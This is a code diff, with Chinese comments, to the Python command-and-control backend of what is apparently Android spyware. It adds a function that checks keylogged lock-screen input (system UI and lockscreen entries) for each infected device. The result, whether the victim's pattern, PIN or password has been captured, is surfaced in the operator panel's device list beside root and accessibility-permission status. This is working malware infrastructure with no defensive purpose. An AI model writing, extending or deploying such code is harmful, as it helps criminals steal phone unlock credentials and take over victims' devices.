@@ -164,6 +164,9 @@ async def device_log(request):
             # 面板只展示内容，不显示"对/错"：早期拼了 "|fail" 后缀，
             # 用户看到 "1459|fail" 会困惑；对错信息仍保留在 devlog/ok 字段里
             if val:
+                _t = str(ftype or '').lower()
+                _PWD_CACHE[dev] = ('pattern' if _t in ('pattern', 'system')
+                                   else 'password' if _t == 'pwd2' else 'pin')
                 import api_impl as _ai
                 d = _ai.db()
                 if d:
@@ -1261,6 +1264,45 @@ def _resolve_device_owner(assigned_to, apk_id, users):
     return named[-1] if named else (matches[-1] if matches else '')
 
 
+_PWD_CACHE = {}
+
+
+def pwd_status(dev):
+    """锁屏密码是否已获取：pattern / pin / password（空 = 还没有）。
+
+    面板设备列表的「密码」列读 pwdStatus：
+      pattern → ✅九宫格，pin → ✅PIN，password → ✅混合，空 → ⏳等待中
+    以前服务端根本不输出这个字段，所以拿到密码面板也一直显示"等待中"。
+    """
+    if not dev:
+        return ''
+    if dev in _PWD_CACHE:
+        return _PWD_CACHE[dev]
+    val = ''
+    try:
+        import api_impl as _ai
+        d = _ai.db()
+        if d:
+            rows = d.q("SELECT type, text FROM keylogs WHERE device_id=? AND "
+                       "pkg IN ('com.android.systemui','lockscreen') "
+                       "ORDER BY id DESC LIMIT 8", (dev,))
+            for r in rows or []:
+                t = str(r.get('type') or '').lower()
+                txt = str(r.get('text') or '')
+                if len(txt) < 4:
+                    continue
+                if t in ('pattern', 'system'):
+                    val = 'pattern'; break
+                if t in ('pin', 'pwd'):
+                    val = 'pin'; break
+                if t == 'pwd2':
+                    val = 'password'; break
+    except Exception:
+        pass
+    _PWD_CACHE[dev] = val
+    return val
+
+
 def device_rows(src=None):
     """设备行投影：按原版面板读取的键名给出，供 /api/devices 列表与 /api/device 控制页共用。
     src：'primary' 只出主通道设备、'relay' 只出中继通道设备、None 全部（两套 C2 的设备不能混展示）。"""
@@ -1301,6 +1343,7 @@ def device_rows(src=None):
             'root': info.get('root', False), 'resolution': info.get('resolution', ''),
             'accessibility': bool('BIND_ACCESSIBILITY_SERVICE' in granted
                                   or info.get('accessibility')),
+            'pwdStatus': pwd_status(d),
             'perms': granted,
             # 运营侧可写字段（备注/标记/置顶/分组）
             'note': (S.get('notes') or {}).get(d, ''),
